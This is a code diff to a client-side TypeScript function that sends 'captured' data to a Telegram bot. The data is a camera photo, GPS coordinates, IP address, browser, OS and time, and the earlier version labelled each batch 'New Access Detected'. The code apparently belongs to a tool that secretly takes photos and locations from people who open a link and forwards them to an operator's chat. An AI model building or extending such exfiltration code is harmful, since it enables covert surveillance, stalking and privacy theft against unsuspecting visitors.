@@ -1,3 +1,5 @@
+"use client"
+
 import axios from 'axios';
 
 const TELEGRAM_API_URL = 'https://api.telegram.org/bot';
@@ -25,34 +27,57 @@ export async function sendTelegramMessage(
   chatId: string,
   data: CaptureData
 ) {
-  const message = `
-🔍 New Access Detected
-
-📸 Photo: [View Image]
-📍 Location: https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}
-🖥️ Device Info:
-  • IP: ${data.deviceInfo.ip}
-  • Browser: ${data.deviceInfo.browser}
-  • OS: ${data.deviceInfo.os}
-  • Time: ${data.deviceInfo.timestamp}
-`;
-
   try {
-    // First send the message
-    await axios.post(`${TELEGRAM_API_URL}${botToken}/sendMessage`, {
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'Markdown'
-    });
+    // Send image
+    if (data.image) {
+      const imageBlob = await fetch(data.image).then(r => r.blob())
+      const imageFormData = new FormData()
+      imageFormData.append('photo', imageBlob, 'capture.jpg')
+      imageFormData.append('chat_id', chatId)
+      imageFormData.append('caption', `New capture from ${data.deviceInfo.browser}`)
 
-    // Then send the photo
-    await axios.post(`${TELEGRAM_API_URL}${botToken}/sendPhoto`, {
-      chat_id: chatId,
-      photo: data.image,
-      caption: 'Captured Image'
-    });
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: imageFormData
+      })
+    }
+
+    // Send location
+    if (data.location.latitude && data.location.longitude) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          latitude: data.location.latitude,
+          longitude: data.location.longitude
+        })
+      })
+    }
+
+    // Send device info
+    const message = `
+Device Information:
+IP: ${data.deviceInfo.ip}
+Browser: ${data.deviceInfo.browser}
+OS: ${data.deviceInfo.os}
+Time: ${new Date(data.deviceInfo.timestamp).toLocaleString()}
+    `.trim()
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
   } catch (error) {
-    console.error('Error sending Telegram message:', error);
-    throw error;
+    console.error('Error sending to Telegram:', error)
+    throw error
   }
 } 
